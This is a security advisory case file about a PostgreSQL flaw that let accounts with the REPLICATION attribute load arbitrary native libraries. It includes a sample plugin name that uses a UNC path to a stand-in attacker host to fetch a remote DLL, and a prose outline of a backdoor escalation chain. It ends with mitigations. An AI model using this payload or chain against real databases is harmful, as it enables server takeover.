---
caseId: "106"
title: "PostgreSQL's replication path loaded plugin code without the check its own LOAD command already had"
filed: "2026-09-06"
filedDisplay: "06 Sep 2026"
firstObserved: "22 Aug 2026"
severity: medium
category: "Configuration / default-settings failure"
status: "Patched"
affectedSystems: "PostgreSQL core, logical replication output-plugin loading (versions 9.4 through 18.5, 17.10, 16.14, 15.18, 14.23; fixed in 18.6, 17.11, 16.15, 15.19, 14.24)"
cve: "CVE-2026-6471 (\"PostGREShell\")"
readTime: "5 min read"
related: ["022", "049", "023"]
---

## Summary

PostgreSQL's logical replication protocol let any account holding the ordinary `REPLICATION` attribute — the kind every backup tool, standby server, and change-data-capture pipeline uses — load an arbitrary native shared library into the server process and run it. The bug had existed since logical decoding shipped in PostgreSQL 9.4, in 2014, and was fixed twelve years later. PostgreSQL is the vector-store backend behind most self-hosted `pgvector` RAG deployments and sits underneath managed offerings like AWS RDS, Supabase, and Neon, many of which enable logical replication by default to keep embedding tables synced for downstream indexing or CDC pipelines — exactly the configuration this bug required.

## What was observed

PostgreSQL already had a guard against this exact class of bug: `check_restricted_library_name()`, called by the SQL `LOAD` command, forces non-superusers to load shared libraries only from one admin-controlled directory, rejecting path separators and traversal sequences. Researchers at Cyera found that the guard was never wired into the logical-replication code path. When a client with the `REPLICATION` attribute issues `CREATE_REPLICATION_SLOT ... LOGICAL <plugin>`, the `<plugin>` name goes straight to `load_external_function()` and from there to `dlopen()` on Linux/macOS or `LoadLibrary()` on Windows, with no call to the restriction check and no rejection of slashes, `../` sequences, or Windows UNC paths.

```
# illustrative — replication path skips the check the SQL LOAD path enforces
plugin_init = load_external_function(plugin, "_PG_output_plugin_init", false, NULL);
# no check_restricted_library_name(plugin) call on this path
```

On Windows this was remotely exploitable with no local footprint at all: a plugin name of `\\attacker-host\share\evil.dll` makes the server resolve it as a UNC path over SMB, silently fetching and mapping the attacker's DLL from a server the attacker controls. On Linux and macOS hosts with NFS automounting active, `../` traversal into `/net/<attacker-host>/...` achieved the same remote fetch over NFS. Everywhere else, an attacker who could already place a file on disk through another channel could load it via traversal. Once loaded, the library's `_PG_init()` function ran immediately with the full privileges of the PostgreSQL server process — code execution, not just a query result. From there the plugin used PostgreSQL's internal C-level APIs, which carry no permission checks of their own, to write directly into the `pg_authid` catalog table and flip every privilege flag for the attacker's role to true, bypassing the SQL executor and every ACL check along with it. The demonstrated proof-of-concept also installed a permission-check hook that unconditionally returned "allowed," rewrote `pg_hba.conf` to accept any password-less connection, and re-registered itself in `shared_preload_libraries` so the backdoor survived a restart and reappeared even if an administrator reverted the privilege change.

> The vulnerability class is a repeat performance: unsandboxed native plugin loading has previously produced Redis's `MODULE LOAD` botnet campaigns (including the 13-year-old, 330,000-instance "RediShell"), and comparable bugs in OpenVPN, MySQL/MariaDB, MongoDB, and SQLite's JDBC driver. The pattern each time is the same — a security boundary built for one entry point into a privileged operation, and never extended to a second entry point added later.

## Mitigation

Upgrade to PostgreSQL 18.6, 17.11, 16.15, 15.19, or 14.24, all of which restore the path-separator check on the replication load path. Independently of the patch, audit every role for `rolreplication = true` and remove the attribute from any account that doesn't strictly need it; the exploit requires nothing more privileged than that flag. Restrict `pg_hba.conf` entries for replication connections to known, trusted addresses rather than broad ranges, and block outbound SMB (445) and NFS (2049) from database hosts at the firewall, which closes off the fully-remote Windows and NFS-automount paths even before patching. Monitor for `CREATE_REPLICATION_SLOT` calls specifying plugin names that contain `/`, `\`, or `..`. The CVSS score PostgreSQL assigned this, 7.2, reflects that exploitation needs an authenticated account with a non-default attribute and, in most deployments, `wal_level = logical` explicitly turned on rather than PostgreSQL's default `replica` setting — real preconditions that keep this out of "unauthenticated, default install" territory. They do not reduce what happens once those two conditions are met: a routine operational credential converts into full superuser and a backdoor that reapplies itself after cleanup.
